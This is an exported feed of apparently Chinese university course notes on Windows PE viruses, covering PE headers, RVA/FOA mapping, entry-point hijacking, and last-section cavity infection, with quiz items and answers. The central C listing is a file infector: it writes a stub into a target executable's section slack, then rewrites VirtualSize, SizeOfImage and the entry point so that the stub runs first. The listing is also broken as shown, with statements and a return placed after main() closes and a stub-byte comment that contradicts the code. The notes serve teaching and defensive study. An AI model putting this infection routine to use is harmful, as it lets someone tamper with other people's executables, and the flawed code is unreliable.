    <content type="html"><![CDATA[<h2 id="末节大小不变的寄生"><a class="markdownIt-Anchor" href="#末节大小不变的寄生"></a> 末节大小不变的寄生</h2><h3 id="需要修改的地方"><a class="markdownIt-Anchor" href="#需要修改的地方"></a> 需要修改的地方</h3><ol><li>填写eb 02 90 90机器码（病毒机器码）</li><li>修改AddressOfEntryPoint</li><li>修改节的VirtualSize</li><li>节的SizeOfRawData不需要修改</li><li>可选映像头SizeOfImage</li></ol><span id="more"></span><h3 id="程序设计"><a class="markdownIt-Anchor" href="#程序设计"></a> 程序设计</h3><p><img src="/images/%E7%97%85%E6%AF%92-Win-%E6%9C%AB%E8%8A%82%E5%AF%84%E7%94%9F%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/image-20210519091939767.png" alt="image-20210519091939767" /></p><h3 id="具体代码"><a class="markdownIt-Anchor" href="#具体代码"></a> 具体代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winnt.h&gt;</span></span></span><br><span class="line"><span class="comment">// 4个字节，放病毒代码 EB 02 09 09</span></span><br><span class="line"><span class="keyword">char</span> code[<span class="number">4</span>];</span><br><span class="line"><span class="comment">//DOS头字段e_lfanew字段偏移0x3c</span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">define</span> OFFSET_OPTHDR_START 0x3c   </span></span><br><span class="line"><span class="comment">//变量ntHdrs  PE文件头（NT头）</span></span><br><span class="line">IMAGE_NT_HEADERS ntHdrs;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//该函数将文件指针定位到NT头</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">locateNTHdrStart</span><span class="params">(FILE * fp)</span>    </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> hdrStart;    <span class="comment">//4个字节，放NT头的偏移量</span></span><br><span class="line">fseek(fp, OFFSET_OPTHDR_START, SEEK_SET); <span class="comment">//定位到e_lfanew字段，0x3c位置</span></span><br><span class="line">fread(&amp;hdrStart, <span class="keyword">sizeof</span>(hdrStart), <span class="number">1</span>, fp); <span class="comment">//读e_lfanew的值到hdrStart</span></span><br><span class="line">fseek(fp, hdrStart, SEEK_SET);               <span class="comment">//定位到NT头</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//该函数读入整个NT头</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">readHdrs</span><span class="params">(FILE * fp)</span>             </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">locateNTHdrStart(fp);</span><br><span class="line">fread(&amp;ntHdrs, <span class="keyword">sizeof</span>(ntHdrs), <span class="number">1</span>, fp);  <span class="comment">//取出一个PE头大小的数据到ntHdrs</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//该函数生成寄生的病毒代码 </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getCode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">code[<span class="number">0</span>] = <span class="number">0xEB</span>;</span><br><span class="line">code[<span class="number">1</span>] = <span class="number">0x02</span>;</span><br><span class="line">code[<span class="number">2</span>] = <span class="number">0x90</span>;</span><br><span class="line">code[<span class="number">3</span>] = <span class="number">0x90</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//获得病毒代码以及读文件NT头的主函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argC, <span class="keyword">char</span> ** args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//获得病毒代码</span></span><br><span class="line">getCode();  </span><br><span class="line"><span class="comment">//打开命令行参数args[1]给出的文件</span></span><br><span class="line">FILE * fp;    </span><br><span class="line">fp = fopen(args[<span class="number">1</span>], “rb+”);   </span><br><span class="line"><span class="comment">//读入文件的NT头</span></span><br><span class="line">readHdrs(fp);      </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//以下代码为找到最后一个节并判断是否有空洞，此时文件指针正好指向节表项起始的位置</span></span><br><span class="line"><span class="comment">// 获得节的数量</span></span><br><span class="line"><span class="keyword">int</span> sectionNum = ntHdrs.FileHeader.NumberOfSections;   <span class="comment">//映像文件头中获得节的总数量</span></span><br><span class="line"><span class="comment">// 定位到最后一个节表项</span></span><br><span class="line">fseek(fp, <span class="keyword">sizeof</span>(IMAGE_SECTION_HEADER) * (sectionNum - <span class="number">1</span>), SEEK_CUR); IMAGE_SECTION_HEADER lastSectionHdr;   <span class="comment">//winnt.h给出了节表项的结构体</span></span><br><span class="line">fread(&amp;lastSectionHdr, <span class="keyword">sizeof</span>(IMAGE_SECTION_HEADER), <span class="number">1</span>, fp);    <span class="comment">//读入最后节的节表项</span></span><br><span class="line"><span class="comment">// 判断最后一节是否有寄生的空洞</span></span><br><span class="line"><span class="keyword">if</span> (lastSectionHdr.SizeOfRawData - lastSectionHdr.Misc.VirtualSize &lt; <span class="number">4</span>)</span><br><span class="line">&#123;<span class="comment">//如果最后段的填充部分不够寄生代码的长度，无法寄生，就退出不感染</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;the last section has not enough space to save virus\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//修改最后一个节的VirtualSize，在最后一个节写入寄生的病毒代码</span></span><br><span class="line"><span class="comment">//修改最后节的VirtualSize</span></span><br><span class="line"> <span class="comment">//之前读了最后一个节表项，重新定位回去</span></span><br><span class="line">fseek(fp, - <span class="keyword">sizeof</span>(IMAGE_SECTION_HEADER), SEEK_CUR);  </span><br><span class="line"> <span class="comment">//后移8个字节跳过name字段，定位到VirtualSize字段</span></span><br><span class="line">fseek(fp, <span class="number">8</span>, SEEK_CUR);</span><br><span class="line"><span class="keyword">int</span> newVirtualSize = lastSectionHdr.Misc.VirtualSize + <span class="number">4</span>;    <span class="comment">//计算新的VirtualSize的值</span></span><br><span class="line">fwrite(&amp;newVirtualSize, <span class="keyword">sizeof</span>(newVirtualSize), <span class="number">1</span>, fp);    <span class="comment">//写入新VirutalSize值到文件中</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//写入寄生代码</span></span><br><span class="line"><span class="comment">//寄生位置：最后一个节的起始位置PointerToRawData + 原来的VirtualSize</span></span><br><span class="line">fseek(fp, lastSectionHdr.PointerToRawData + lastSectionHdr.Misc.VirtualSize , SEEK_SET);</span><br><span class="line">fwrite(code, <span class="number">4</span>, <span class="number">1</span>, fp);<span class="comment">//写4字节的寄生代码</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//修改SizeOfImage和EntryPoint</span></span><br><span class="line"><span class="comment">//1. 获取AddressOfEntry和SizeOfImage字段到NT头的偏移量</span></span><br><span class="line"><span class="keyword">int</span> offsetEntry = (<span class="keyword">int</span>)&amp;((IMAGE_NT_HEADERS *)<span class="number">0</span> )-&gt;OptionalHeader.AddressOfEntryPoint;</span><br><span class="line"><span class="keyword">int</span> offsetImageSize = (<span class="keyword">int</span>)&amp;((IMAGE_NT_HEADERS *)<span class="number">0</span> )-&gt;OptionalHeader.SizeOfImage;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2. 修改SizeOfImage  （文件指针在NT头）</span></span><br><span class="line">locateNTHdrStart(fp);                      <span class="comment">//重新定位到NT头</span></span><br><span class="line">fseek(fp, offsetImageSize, SEEK_CUR);                    <span class="comment">// 定位到字段SizeOfImage</span></span><br><span class="line"><span class="comment">//  ( RVA + VirtualSize + 4  /  SectionAlignment ) 向上取整</span></span><br><span class="line"><span class="keyword">int</span> accurateSize = (lastSectionHdr.VirtualAddress + lastSectionHdr.Misc.VirtualSize + <span class="number">4</span>); </span><br><span class="line"><span class="keyword">int</span> pageNum = accurateSize  / ntHdrs.OptionalHeader.SectionAlignment;   </span><br><span class="line"><span class="keyword">int</span> imageSize = (pageNum) * ntHdrs.OptionalHeader.SectionAlignment &lt; accurateSize ? </span><br><span class="line">                   (pageNum + <span class="number">1</span>) * ntHdrs.OptionalHeader.SectionAlignment : accurateSize;   <span class="comment">//取上整</span></span><br><span class="line"><span class="comment">// 写入新的SizeOfImage值</span></span><br><span class="line">fwrite(&amp;imageSize, <span class="keyword">sizeof</span>(imageSize), <span class="number">1</span>, fp);</span><br><span class="line"></span><br><span class="line"><span class="comment">//3. 修改入口点AddressOfEntryPoint</span></span><br><span class="line">locateNTHdrStart(fp);<span class="comment">//重新定位文件指针到NT头</span></span><br><span class="line">fseek(fp, offsetEntry, SEEK_CUR);<span class="comment">//定位到AdressOfEntryPoint字段</span></span><br><span class="line"><span class="comment">// 新的入口RVA = 最后节的起始RVA + 最后节原来的VirtualSize，这样就指向寄生代码起始了</span></span><br><span class="line"><span class="keyword">int</span> entry = lastSectionHdr.VirtualAddress + lastSectionHdr.Misc.VirtualSize;</span><br><span class="line">fwrite(&amp;entry, <span class="keyword">sizeof</span>(entry), <span class="number">1</span>, fp);<span class="comment">//写新的入口RVA</span></span><br><span class="line">fclose(fp);</span><br></pre></td></tr></table></figure><h3 id="返回原始程序"><a class="markdownIt-Anchor" href="#返回原始程序"></a> 返回原始程序</h3><p>在病毒代码最后增加JMP xx xx xx xx</p><p>位移量如何计算？</p><p><img src="/images/%E7%97%85%E6%AF%92-Win-%E6%9C%AB%E8%8A%82%E5%AF%84%E7%94%9F%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/image-20210519093251556.png" alt="image-20210519093251556" /></p><h3 id="例题"><a class="markdownIt-Anchor" href="#例题"></a> 例题</h3><ol><li>将病毒寄生在末节空洞的程序设计中，下列说法不正确的是（       ）<br />A.  &lt;windows.h&gt;和&lt;winnt.h&gt;提供了PE文件头相关的结构体定义<br />B.  病毒程序想访问AddressOfEntryPoint时，可以先将NT头信息由文件读到相应的结构体变量中<br />C.  病毒程序需要生成寄生到原文件的病毒代码<br />D.  寄生完成后，病毒程序需要修改结构体变量中的成员virtualSize和imageSize来确保寄生的病毒代码被加载到内存</li></ol><p>参考答案：D</p><p>解析：病毒程序没有修改结构体变量中的成员，而是直接更改文件</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;末节大小不变的寄生&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#末节大小不变的寄生&quot;&gt;&lt;/a&gt; 末节大小不变的寄生&lt;/h2&gt;
&lt;h3 id=&quot;需要修改的地方&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#需要修改的地方&quot;&gt;&lt;/a&gt; 需要修改的地方&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;填写eb 02 90 90机器码（病毒机器码）&lt;/li&gt;
&lt;li&gt;修改AddressOfEntryPoint&lt;/li&gt;
&lt;li&gt;修改节的VirtualSize&lt;/li&gt;
&lt;li&gt;节的SizeOfRawData不需要修改&lt;/li&gt;
&lt;li&gt;可选映像头SizeOfImage&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="病毒" scheme="https://wsw8.online/categories/%E7%97%85%E6%AF%92/"/>
    
    
    <category term="课程" scheme="https://wsw8.online/tags/%E8%AF%BE%E7%A8%8B/"/>
    
    <category term="病毒" scheme="https://wsw8.online/tags/%E7%97%85%E6%AF%92/"/>
    
    <category term="计算机" scheme="https://wsw8.online/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>病毒_Win_PE结构和末节寄生</title>
    <link href="https://wsw8.online/archives/20191e8a.html"/>
    <id>https://wsw8.online/archives/20191e8a.html</id>
    <published>2021-05-12T12:18:01.000Z</published>
    <updated>2021-05-19T01:11:34.934Z</updated>
    
    <content type="html"><![CDATA[<h2 id="pe格式"><a class="markdownIt-Anchor" href="#pe格式"></a> PE格式</h2><p>在Win32位平台可执行文件命名为可移植的可执行文件（Portable Executable File），该文件的格式就是PE格式</p><p>在Win32系统中，常见的EXE，DLL，SYS，COM等可执行文件都是PE文件</p><span id="more"></span><h3 id="图示"><a class="markdownIt-Anchor" href="#图示"></a> 图示</h3><p><img src="/images/%E7%97%85%E6%AF%92-Win-PE%E7%BB%93%E6%9E%84%E5%92%8C%E6%9C%AB%E8%8A%82%E5%AF%84%E7%94%9F/image-20210517151959406.png" alt="image-20210517151959406" /></p><h3 id="映像"><a class="markdownIt-Anchor" href="#映像"></a> 映像</h3><ol><li>PE文件的加载要完成虚拟地址（内存）和PE文件（硬盘）之间的映射关系，所以又被称为映像文件</li><li>当真正执行某个内存页的指令或访问一个页的数据时，这个页面才会真正读入内存</li><li>所以文件装入速度与文件大小关系不大</li><li>注意区分文件位置与虚拟地址与相对虚拟地址</li></ol><h3 id="相对虚拟地址rva"><a class="markdownIt-Anchor" href="#相对虚拟地址rva"></a> 相对虚拟地址（RVA）</h3><ol><li><p>虚拟地址，即我们前面提到的逻辑地址，指的是内存中的地址（注意和硬盘上文件中的位置相区分）</p></li><li><p>相对地址，即相对PE文件加载到内存后占用的最开始的那个内存单元的逻辑地址（基地址）</p></li><li><p>区分RVA和FOA</p><blockquote><p>RVA：内存中的相对位置，相对的是加载到内存的基地址</p><p>FOA：文件中的相对位置，相对的是文件的开始位置（即0）</p><p>在文件中，一个节往往按512B（200H）的粒度对齐</p><p>在内存中，一个节通常按4096（1000H）的粒度对齐</p><p>所以内存的RVA和文件的FOA通常是不一致的</p><p><img src="/images/%E7%97%85%E6%AF%92-Win-PE%E7%BB%93%E6%9E%84%E5%92%8C%E6%9C%AB%E8%8A%82%E5%AF%84%E7%94%9F/image-20210517153940694.png" alt="image-20210517153940694" /></p><p>（由于装载时前面的一般不动，DOS部分、PE文件头部分、节表部分、和第一个节的RVA和FOA通常一致）</p></blockquote></li><li><p>图示</p><blockquote><p><img src="/images/%E7%97%85%E6%AF%92-Win-PE%E7%BB%93%E6%9E%84%E5%92%8C%E6%9C%AB%E8%8A%82%E5%AF%84%E7%94%9F/image-20210517153120815.png" alt="image-20210517153120815" /></p><p>在图示中，基地址是0x00400000，.text节的RVA是0x1560，VA是0x00401560</p></blockquote></li></ol><h3 id="dos头部分"><a class="markdownIt-Anchor" href="#dos头部分"></a> DOS头部分</h3><p>图示，仅供参考无需记忆：</p><p><img src="/images/%E7%97%85%E6%AF%92-Win-PE%E7%BB%93%E6%9E%84%E5%92%8C%E6%9C%AB%E8%8A%82%E5%AF%84%E7%94%9F/image-20210517154415235.png" alt="image-20210517154415235" /></p><p>头部的e_magic，就是两个字符MZ，代表DOS文件<br />最后一个字段e_lfanew是偏移量，就是文件开始到PE文件头（NT头）的偏移量</p><h3 id="pe头"><a class="markdownIt-Anchor" href="#pe头"></a> PE头</h3><p>包含3个部分</p><ol><li>PE文件标志（Signature）</li><li>映像文件头（IMAGE_FILE_HEADER）</li><li>可选映像文件头（IMAGE_OPTIONAL_HEADER32）</li></ol><h4 id="pe文件标志"><a class="markdownIt-Anchor" href="#pe文件标志"></a> PE文件标志</h4><p>两个字节为PE表明是PE格式文件</p><p>故而判断文件是否为PE格式可以通过：</p><ol><li>先判断文件头2个字节是否为MZ</li><li>判断NT头（PE头）的Signature是否为PE</li></ol><h4 id="映像文件头"><a class="markdownIt-Anchor" href="#映像文件头"></a> 映像文件头</h4><p><img src="/images/%E7%97%85%E6%AF%92-Win-PE%E7%BB%93%E6%9E%84%E5%92%8C%E6%9C%AB%E8%8A%82%E5%AF%84%E7%94%9F/image-20210517155329619.png" alt="image-20210517155329619" /></p><p>对病毒来说，可能需要用到NumberOfSections</p><h4 id="可选映像头"><a class="markdownIt-Anchor" href="#可选映像头"></a> 可选映像头</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">Option Header </span><br><span class="line">TImage_Optional_Header32 = record</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Standard fields.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    Magic: Word;</span><br><span class="line">    MajorLinkerVersion: Byte;</span><br><span class="line">    MinorLinkerVersion: Byte;</span><br><span class="line">    SizeOfCode: Cardinal;</span><br><span class="line">    SizeOfInitializedData: Cardinal;</span><br><span class="line">    SizeOfUninitializedData: Cardinal;</span><br><span class="line">    AddressOfEntryPoint: Cardinal;         <span class="comment">//代码入口RVA，第一条指令的RAV</span></span><br><span class="line">    BaseOfCode: Cardinal;</span><br><span class="line">    BaseOfData: Cardinal;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// NT additional fields.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    ImageBase: Cardinal;<span class="comment">//载入程序的首选RAV</span></span><br><span class="line">    SectionAlignment: Cardinal;<span class="comment">//节在内存中对齐方式</span></span><br><span class="line">    FileAlignment: Cardinal;<span class="comment">//节在文件中对齐方式</span></span><br><span class="line">    MajorOperatingSystemVersion: Word;</span><br><span class="line">    MinorOperatingSystemVersion: Word;</span><br><span class="line">    MajorImageVersion: Word;</span><br><span class="line">    MinorImageVersion: Word;</span><br><span class="line">    MajorSubsystemVersion: Word;</span><br><span class="line">    MinorSubsystemVersion: Word;</span><br><span class="line">    Win32VersionValue: Cardinal;</span><br><span class="line">    SizeOfImage: Cardinal;       <span class="comment">//内存中整个PE文件的总大小，按内存对齐</span></span><br><span class="line">    SizeOfHeaders: Cardinal;</span><br><span class="line">    CheckSum: Cardinal;</span><br><span class="line">    Subsystem: Word;</span><br><span class="line">    DllCharacteristics: Word;</span><br><span class="line">    SizeOfStackReserve: Cardinal;</span><br><span class="line">    SizeOfStackCommit: Cardinal;</span><br><span class="line">    SizeOfHeapReserve: Cardinal;</span><br><span class="line">    SizeOfHeapCommit: Cardinal;</span><br><span class="line">    LoaderFlags: Cardinal;</span><br><span class="line">    NumberOfRvaAndSizes: Cardinal;<span class="comment">//数据目录的项数</span></span><br><span class="line">    DataDirectory: <span class="built_in">array</span>[<span class="number">0.</span>.IMAGE_NUMBEROF_DIRECTORY_ENTRIES - <span class="number">1</span>] of        </span><br><span class="line">                                                               TImage_Data_Directory;<span class="comment">//数据目录表</span></span><br><span class="line">  end;</span><br></pre></td></tr></table></figure><p>上述注释为可能用到的字段，<strong>“AddressOfEntryPoint”很关键</strong></p><h2 id="利用入口rva实现病毒执行"><a class="markdownIt-Anchor" href="#利用入口rva实现病毒执行"></a> 利用入口RVA实现病毒执行</h2><h3 id="修改入口地址对应指令"><a class="markdownIt-Anchor" href="#修改入口地址对应指令"></a> 修改入口地址对应指令</h3><ol><li><p>用PEView定位到AddressOfEntryPoint</p></li><li><p>用UE定位到AddressOfEntryPoint的值位置（注意值是RVA）</p></li><li><p>通过RVA找到文件的FOA</p><blockquote><p>入口点的RVA（AddressOfEntryPoint）- 节的RVA =</p><p>入口点的FOA - 节的起始文件位置（PointerToRawData）</p></blockquote></li><li><p>用eb 02 90 90替代原来内容，该指令汇编为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">jmp aa</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">aa:</span><br></pre></td></tr></table></figure></li><li><p>用OD启动修改后程序，OD将停在第一条指令，观察第一条指令是eb 02 90 90</p></li><li><p>成功</p></li><li><p>注：程序的ImageBase+AddressOfEntryPoint就是入口点地址</p></li></ol><h3 id="直接修改入口点地址"><a class="markdownIt-Anchor" href="#直接修改入口点地址"></a> 直接修改入口点地址</h3><ol><li>找到AddressOfEntryPoint字段在文件中的偏移</li><li>用UE修改就好</li></ol><h3 id="例题"><a class="markdownIt-Anchor" href="#例题"></a> 例题</h3><ol><li>下列哪个字段不在PE文件的可选头中（    ）<br />A．入口点地址<br />B．文件对齐大小<br />C．子系统<br />D．节表</li></ol><p>参考答案：D</p><p>解析：由前面的图知道，节表是在PE文件头后面的</p><h2 id="病毒加载到内存的问题"><a class="markdownIt-Anchor" href="#病毒加载到内存的问题"></a> 病毒加载到内存的问题</h2><h3 id="节表"><a class="markdownIt-Anchor" href="#节表"></a> 节表</h3><ol><li>节表紧跟在PE文件头后面，节表中每一个结构ImageSectionHeader（28H）都对应一个节，其中，SizeOfRawData描述了对应节的文件大小，VirtualSize描述了加载到内存的大小（两者可能不同，文件大小可以大于也可以小于内存大小，小于时将在内存补0）</li><li>在PE文件头的可选映像头中，SizeOfImage给出了整个程序包括所有头部加载到内存后的大小，其大小是SectionAlignment的整数倍（SectionAlignment是内存对齐的粒度、FileAlignment是文件对齐的粒度）</li><li>简单说，就是PE文件总大小和每个节的大小都有参数</li></ol><p>图示：</p><p><img src="/images/%E7%97%85%E6%AF%92-Win-PE%E7%BB%93%E6%9E%84%E5%92%8C%E6%9C%AB%E8%8A%82%E5%AF%84%E7%94%9F/image-20210519083535334.png" alt="image-20210519083535334" /></p><h2 id="末节寄生"><a class="markdownIt-Anchor" href="#末节寄生"></a> 末节寄生</h2><h3 id="思想"><a class="markdownIt-Anchor" href="#思想"></a> 思想</h3><ol><li>如果该节内存大小&lt;文件大小，我们就在文件中将指令加载到该节的多余部分（对齐后的空洞）</li><li>然后修改节表SectionHeader中的VirtualSize字段（加载到内存的字节数）为修改后的大小，而对齐后的文件大小SizeOfRowData保持不变</li><li>注意，有时exe最后一个字节后有一些调试信息，但它不会被加载到内存，这也许就是SizeOfImage的意义，它阻止尾部多余信息进入内存</li></ol><h3 id="具体操作"><a class="markdownIt-Anchor" href="#具体操作"></a> 具体操作</h3><ol><li>首先找到最后一个节在文件中的位置，即其节表项中PointerToRawData字段</li><li>找到节中的寄生位置，就是VirtualSize字段后面</li><li>找到在文件中的寄生位置，PointerToRawData+VirtualSize</li><li>用UE在文件偏移到该处进行修改</li><li>修改最后一个节表中的VirtualSize</li><li>计算SizeOfImage=程序大小/SectionOfImage并向上取整，查看是否需要修改</li><li>修改AddressOfEntryPoint为新的程序入口RVA</li></ol><h3 id="文件长度变大"><a class="markdownIt-Anchor" href="#文件长度变大"></a> 文件长度变大</h3><ol><li>在reloc节原VirutalSize后添加JMP xx xx，在DOS部分已知机器码偏移量为两字节E9 xx xx</li><li>在reloc节后添加两个NOP指令</li><li>修改reloc节头的SizeOfRawData，加一个FileAlignment（1000h），为2000h</li><li>修改reloc节头的VirtualSize为原SizeOfRawData+2(两个nop) ，现在NOP才是实际结尾</li><li>修改可选映像头的SizeOfImage = (relocRVA+新VirutalSize)除以SectionAlign取上整</li><li>在NOP后手动增加1000h-2个字节，内容不论，为对齐后填充内容，以前是编译器自动填充</li><li>修改入口点RAV（AddressOfEntryPoint）</li></ol><p>图示：</p><p><img src="/images/%E7%97%85%E6%AF%92-Win-PE%E7%BB%93%E6%9E%84%E5%92%8C%E6%9C%AB%E8%8A%82%E5%AF%84%E7%94%9F/image-20210519085921966.png" alt="image-20210519085921966" /></p><h3 id="例题-2"><a class="markdownIt-Anchor" href="#例题-2"></a> 例题</h3><ol><li>关于PE文件病毒，下列说法不正确的是（       ）<br />A. 需要对PE文件头的某些字段进行修改，保证感染后的PE文件合法<br />B. PE文件感染必然会增加PE文件的大小<br />C. 病毒可以通过修改PE文件入口点的值或者入口点处的指令来获得执行机会<br />D. 病毒可以将自身且分为多段，分别插入到PE文件各节的空洞中</li></ol><p>参考答案：B</p><p>解析：PE文件感染有的方式是不改变PE文件大小的</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;pe格式&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#pe格式&quot;&gt;&lt;/a&gt; PE格式&lt;/h2&gt;
&lt;p&gt;在Win32位平台可执行文件命名为可移植的可执行文件（Portable Executable File），该文件的格式就是PE格式&lt;/p&gt;
&lt;p&gt;在Win32系统中，常见的EXE，DLL，SYS，COM等可执行文件都是PE文件&lt;/p&gt;</summary>
    
    
    
    <category term="病毒" scheme="https://wsw8.online/categories/%E7%97%85%E6%AF%92/"/>
    
    
    <category term="课程" scheme="https://wsw8.online/tags/%E8%AF%BE%E7%A8%8B/"/>
    
    <category term="病毒" scheme="https://wsw8.online/tags/%E7%97%85%E6%AF%92/"/>
    
    <category term="计算机" scheme="https://wsw8.online/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>病毒_Win_虚拟地址</title>
    <link href="https://wsw8.online/archives/c7304b6b.html"/>
    <id>https://wsw8.online/archives/c7304b6b.html</id>
    <published>2021-05-12T08:06:01.000Z</published>
    <updated>2021-05-12T12:15:13.074Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ollydebug简介"><a class="markdownIt-Anchor" href="#ollydebug简介"></a> OllyDebug简介</h2><p>Windows下用户级调试神器——OllyDebug，简称OD</p><p>OD是强大的动态追踪工具，具有可视化操作界面，但是非常占内存</p><span id="more"></span><h3 id="基本功能"><a class="markdownIt-Anchor" href="#基本功能"></a> 基本功能</h3><ol><li>启动一个程序调试</li><li>Attach到一个已经运行的程序调试</li><li>单步，step into and step over</li><li>断点</li><li>继续运行</li><li>查看内存</li><li>修改内存</li><li>查看寄存器</li><li>修改寄存器</li><li>代码窗体跳到指定地址</li><li>修改指令</li><li>查看一个进程加载的dll</li><li>查看dll中有哪些函数</li><li>查找内存中的某个值</li></ol><h3 id="动态链接库dll"><a class="markdownIt-Anchor" href="#动态链接库dll"></a> 动态链接库DLL</h3><p>DLL（Dynamic Link Libraries）使得更新和重用程序更加方便</p><ol><li>是程序的一部分，作为模块被进程加载到自己的空间地址</li><li>在编译时不会插入可执行文件中，在运行时整个库的代码才会调入内存，这就是所谓的“动态链接”</li></ol><p>一些重要的动态链接库：</p><blockquote><p>Windows中有几个非常重要的底层DLL：Kernel32.dll、User32.dll、GDI32.dll、ntdll.dll</p><ol><li>Kernel32.dll顾名思义就是内核相关的功能，主要包含用于管理内存、进程和线程的函数</li><li>User32.dll中包含的则是用于执行用户界面的函数，比如把用户的鼠标点击操作传递给窗口，以便窗口根据用户的点击来执行预定的事件</li><li>GDI32.dll的名称用了缩写，全称是Graphical Device 